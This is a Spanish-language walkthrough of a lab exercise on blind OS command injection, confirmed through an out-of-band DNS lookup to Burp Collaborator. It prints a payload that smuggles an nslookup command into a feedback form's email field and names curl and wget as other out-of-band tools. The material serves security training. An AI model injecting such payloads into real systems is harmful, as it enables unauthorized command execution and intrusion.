# 💉 Inyección ciega con interacción OOB

## 📄 Descripción del laboratorio

La funcionalidad **Submit feedback** es vulnerable a **inyección de comandos del sistema operativo ciega**.

El comando se ejecuta de forma **asíncrona**, no devuelve salida en la respuesta HTTP y **no es posible redirigirla a un directorio accesible públicamente**.

🎯 **Objetivo del laboratorio:**

* Confirmar la ejecución del comando
* Provocar una interacción **fuera de banda (OOB)** mediante una consulta DNS
* Usar **Burp Collaborator** para observar la interacción

 

## 📚 Teoría

En escenarios de **blind OS command injection** donde:

* ❌ No hay salida visible
* ❌ No hay escritura en rutas públicas

la forma más fiable de confirmación es **OAST (Out-of-Band Application Security Testing)**.

### Técnicas OOB más comunes

* 📡 **DNS**: `nslookup`, `dig`, `ping`
* 🌍 **HTTP**: `curl`, `wget`
* 📁 **Otros protocolos**: FTP, SMB, etc.

En este laboratorio se utiliza **DNS** porque:

* Está disponible en casi todos los sistemas
* No requiere puertos salientes especiales
* Es fácil de monitorizar con **Burp Collaborator**

Idea clave:

Si el servidor ejecuta:

```bash
nslookup subdominio.collaborator.net
```

y vemos esa consulta en **Collaborator**, significa que **el comando se ejecutó en el servidor**.

 

## 📝 Práctica

### 1️⃣ Interceptar el feedback

Accedemos a **Submit feedback**.

Enviamos un formulario de prueba e interceptamos la petición **POST** con **Burp Suite**.

La petición contiene varios parámetros, por ejemplo:

* `name`
* `email`
* `subject`
* `message`

 

### 2️⃣ Identificar el parámetro vulnerable

Probamos inyectar payloads simples en cada parámetro hasta confirmar que **email** se concatena directamente al comando del sistema.

 

### 3️⃣ Inyección del payload OOB

Inyectamos un comando que fuerza una **resolución DNS** hacia nuestro servidor de **Burp Collaborator**.

Ejemplo:

```bash
email=test@test.com;nslookup abc123xyz.burpcollaborator.net
```

Aparecen **consultas DNS** hacia nuestro subdominio de Collaborator:

* Origen: servidor víctima
* Destino: dominio controlado por nosotros

Esto confirma:

* Ejecución del comando inyectado
* Existencia de **inyección de comandos ciega**
* Capacidad de interacción externa (**OOB**)
